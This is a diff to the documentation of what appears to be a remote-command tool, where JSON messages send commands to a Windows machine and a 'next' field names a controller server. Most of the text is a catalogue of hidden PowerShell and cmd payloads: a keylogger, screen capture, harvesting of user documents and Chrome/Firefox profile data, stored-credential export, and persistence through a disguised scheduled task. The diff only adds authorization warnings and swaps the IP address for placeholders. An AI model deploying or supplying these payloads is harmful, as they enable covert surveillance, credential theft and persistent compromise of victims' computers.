@@ -191,12 +191,16 @@ Test the program with various scenarios:
 
 ## Useful Commands for Remote Execution
 
-The following commands can be sent via the JSON `command` key for various purposes:
+**⚠️ AUTHORIZATION REQUIRED**: The following command examples are provided for educational and authorized security testing purposes only. **You MUST have explicit written authorization** to test these commands on any system. Only use these commands on systems you own or have explicit written permission to test.
+
+**⚠️ REPLACE PLACEHOLDERS**: All example commands contain placeholders like `[YOUR_SERVER_IP]` or example IPs. **You MUST replace these with your own authorized test server addresses** before use.
 
 ### Keylogger Operations
 
+**⚠️ WARNING**: Keylogging operations are highly invasive and may be illegal in many jurisdictions. Only use in authorized penetration testing scenarios with explicit written consent.
+
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"$keylog = ''; while($true) { $key = $null; $key = [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}'); Start-Sleep -Milliseconds 100; }\"", "sleep": 5, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"$keylog = ''; while($true) { $key = $null; $key = [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}'); Start-Sleep -Milliseconds 100; }\"", "sleep": 5, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -210,7 +214,7 @@ while($true) {
 ```
 
 ```json
-{"command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1", "sleep": 10, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1", "sleep": 10, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -221,8 +225,10 @@ powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1
 
 ### Screenshot Operations
 
+**⚠️ AUTHORIZATION REQUIRED**: Screenshot operations capture sensitive visual information. Only use on systems you own or have explicit written authorization to test.
+
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save('screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose()\"", "sleep": 5, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save('screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose()\"", "sleep": 5, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -248,7 +254,7 @@ $bmp.Dispose()
 ```
 
 ```json
-{"command": "nircmd.exe savescreenshot screenshot.png", "sleep": 3, "next": "192.168.1.100"}
+{"command": "nircmd.exe savescreenshot screenshot.png", "sleep": 3, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -258,8 +264,10 @@ nircmd.exe savescreenshot screenshot.png
 
 ### File Operations
 
+**⚠️ AUTHORIZATION REQUIRED**: File operations may access sensitive data. Only use on systems you own or have explicit written authorization to test.
+
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"Compress-Archive -Path C:\\Users\\*\\Documents\\* -DestinationPath docs.zip -Force\"", "sleep": 2, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"Compress-Archive -Path C:\\Users\\*\\Documents\\* -DestinationPath docs.zip -Force\"", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -269,7 +277,7 @@ Compress-Archive -Path C:\Users\*\Documents\* -DestinationPath docs.zip -Force
 ```
 
 ```json
-{"command": "certutil -encode file.txt encoded.txt && type encoded.txt", "sleep": 1, "next": "192.168.1.100"}
+{"command": "certutil -encode file.txt encoded.txt && type encoded.txt", "sleep": 1, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -279,7 +287,7 @@ type encoded.txt
 ```
 
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.pdf,*.doc,*.docx -ErrorAction SilentlyContinue | Select-Object FullName | Out-File files.txt\"", "sleep": 5, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.pdf,*.doc,*.docx -ErrorAction SilentlyContinue | Select-Object FullName | Out-File files.txt\"", "sleep": 5, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -294,8 +302,10 @@ Get-ChildItem -Path C:\Users -Recurse `
 
 ### Network Operations
 
+**⚠️ AUTHORIZATION REQUIRED**: Network information gathering should only be performed on systems you own or have explicit written authorization to test.
+
 ```json
-{"command": "ipconfig /all > network_info.txt", "sleep": 2, "next": "192.168.1.100"}
+{"command": "ipconfig /all > network_info.txt", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -304,7 +314,7 @@ ipconfig /all > network_info.txt
 ```
 
 ```json
-{"command": "netstat -ano > connections.txt", "sleep": 2, "next": "192.168.1.100"}
+{"command": "netstat -ano > connections.txt", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -313,7 +323,7 @@ netstat -ano > connections.txt
 ```
 
 ```json
-{"command": "arp -a > arp_table.txt", "sleep": 1, "next": "192.168.1.100"}
+{"command": "arp -a > arp_table.txt", "sleep": 1, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -323,8 +333,10 @@ arp -a > arp_table.txt
 
 ### System Information
 
+**⚠️ AUTHORIZATION REQUIRED**: System information gathering should only be performed on systems you own or have explicit written authorization to test.
+
 ```json
-{"command": "systeminfo > system_info.txt", "sleep": 3, "next": "192.168.1.100"}
+{"command": "systeminfo > system_info.txt", "sleep": 3, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -333,7 +345,7 @@ systeminfo > system_info.txt
 ```
 
 ```json
-{"command": "wmic process list full > processes.txt", "sleep": 2, "next": "192.168.1.100"}
+{"command": "wmic process list full > processes.txt", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -342,7 +354,7 @@ wmic process list full > processes.txt
 ```
 
 ```json
-{"command": "wmic service list brief > services.txt", "sleep": 2, "next": "192.168.1.100"}
+{"command": "wmic service list brief > services.txt", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -352,8 +364,10 @@ wmic service list brief > services.txt
 
 ### Data Exfiltration
 
+**⚠️ CRITICAL WARNING**: Data exfiltration operations are highly sensitive and may violate privacy laws. **ONLY use on systems you own or have explicit written authorization to test.** Unauthorized data exfiltration is illegal and may result in criminal prosecution.
+
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"$files = Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.pdf -ErrorAction SilentlyContinue | Select-Object -First 10 FullName; $files | ForEach-Object { Copy-Item $_.FullName -Destination C:\\temp\\ }\"", "sleep": 10, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"$files = Get-ChildItem -Path C:\\Users -Recurse -Include *.txt,*.pdf -ErrorAction SilentlyContinue | Select-Object -First 10 FullName; $files | ForEach-Object { Copy-Item $_.FullName -Destination C:\\temp\\ }\"", "sleep": 10, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -371,7 +385,7 @@ $files | ForEach-Object {
 ```
 
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"$cred = Get-StoredCredential -Target *; $cred | Export-Clixml creds.xml\"", "sleep": 3, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"$cred = Get-StoredCredential -Target *; $cred | Export-Clixml creds.xml\"", "sleep": 3, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -383,8 +397,10 @@ $cred | Export-Clixml creds.xml
 
 ### Registry Operations
 
+**⚠️ AUTHORIZATION REQUIRED**: Registry operations can modify system configuration. Only use on systems you own or have explicit written authorization to test.
+
 ```json
-{"command": "reg export HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run startup.reg", "sleep": 2, "next": "192.168.1.100"}
+{"command": "reg export HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run startup.reg", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -393,7 +409,7 @@ reg export HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run start
 ```
 
 ```json
-{"command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s > installed_software.txt", "sleep": 5, "next": "192.168.1.100"}
+{"command": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s > installed_software.txt", "sleep": 5, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -403,8 +419,10 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s > installe
 
 ### Process Management
 
+**⚠️ AUTHORIZATION REQUIRED**: Process management operations should only be performed on systems you own or have explicit written authorization to test.
+
 ```json
-{"command": "tasklist /svc > running_processes.txt", "sleep": 2, "next": "192.168.1.100"}
+{"command": "tasklist /svc > running_processes.txt", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -413,7 +431,7 @@ tasklist /svc > running_processes.txt
 ```
 
 ```json
-{"command": "wmic startup get caption,command > startup_programs.txt", "sleep": 2, "next": "192.168.1.100"}
+{"command": "wmic startup get caption,command > startup_programs.txt", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -423,8 +441,10 @@ wmic startup get caption,command > startup_programs.txt
 
 ### Browser Data
 
+**⚠️ CRITICAL WARNING**: Browser data collection accesses highly sensitive personal information including passwords, browsing history, and authentication tokens. **ONLY use on systems you own or have explicit written authorization to test.** Unauthorized access to browser data is illegal.
+
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"Copy-Item -Path \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\" -Destination C:\\temp\\chrome_data\\ -Recurse -ErrorAction SilentlyContinue\"", "sleep": 10, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"Copy-Item -Path \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\" -Destination C:\\temp\\chrome_data\\ -Recurse -ErrorAction SilentlyContinue\"", "sleep": 10, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -437,7 +457,7 @@ Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\*" `
 ```
 
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"Copy-Item -Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\" -Destination C:\\temp\\firefox_data\\ -Recurse -ErrorAction SilentlyContinue\"", "sleep": 10, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"Copy-Item -Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\" -Destination C:\\temp\\firefox_data\\ -Recurse -ErrorAction SilentlyContinue\"", "sleep": 10, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -451,8 +471,10 @@ Copy-Item -Path "$env:APPDATA\Mozilla\Firefox\Profiles\*" `
 
 ### Stealth Operations
 
+**⚠️ AUTHORIZATION REQUIRED**: Stealth operations are designed to evade detection. Only use in authorized penetration testing scenarios with explicit written consent.
+
 ```json
-{"command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"Start-Process cmd.exe -WindowStyle Hidden -ArgumentList '/c command_here'\"", "sleep": 2, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"Start-Process cmd.exe -WindowStyle Hidden -ArgumentList '/c command_here'\"", "sleep": 2, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -464,7 +486,7 @@ Start-Process cmd.exe `
 ```
 
 ```json
-{"command": "schtasks /create /tn \"UpdateTask\" /tr \"command_here\" /sc onlogon /f", "sleep": 1, "next": "192.168.1.100"}
+{"command": "schtasks /create /tn \"UpdateTask\" /tr \"command_here\" /sc onlogon /f", "sleep": 1, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
@@ -474,8 +496,10 @@ schtasks /create /tn "UpdateTask" /tr "command_here" /sc onlogon /f
 
 ### Combined Operations
 
+**⚠️ AUTHORIZATION REQUIRED**: Combined operations execute multiple sensitive actions. Only use on systems you own or have explicit written authorization to test.
+
 ```json
-{"command": "powershell -WindowStyle Hidden -Command \"$screenshot = 'screenshot.png'; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose(); systeminfo > sysinfo.txt; ipconfig /all > netinfo.txt\"", "sleep": 5, "next": "192.168.1.100"}
+{"command": "powershell -WindowStyle Hidden -Command \"$screenshot = 'screenshot.png'; Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bmp.Save($screenshot, [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose(); systeminfo > sysinfo.txt; ipconfig /all > netinfo.txt\"", "sleep": 5, "next": "[YOUR_SERVER_IP]"}
 ```
 
 **Prettified Command:**
